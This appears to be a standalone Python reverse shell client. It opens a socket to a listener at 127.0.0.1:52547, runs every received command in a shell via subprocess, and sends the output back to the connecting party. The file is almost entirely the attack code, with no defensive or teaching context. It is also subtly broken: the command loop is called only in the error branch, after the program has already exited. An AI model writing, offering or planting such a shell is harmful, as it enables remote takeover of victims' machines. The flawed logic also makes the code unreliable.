import  sys
import socket
import  os
import  subprocess


def receiver(s):
    while True:
        cmd_bytes = s.recv(1024)
        cmd = cmd_bytes.decode('utf-8')
        if cmd.startswith("cd"):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd,shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.send(data+b"$:")



def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection Established. ")
        print(f"Address {address}")
    except socket.error as error:
        print("Somethings Wrong i can feel it ... ")
        print (error)
        sys.exit()
        receiver(s)

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 52547
    connect((host,port))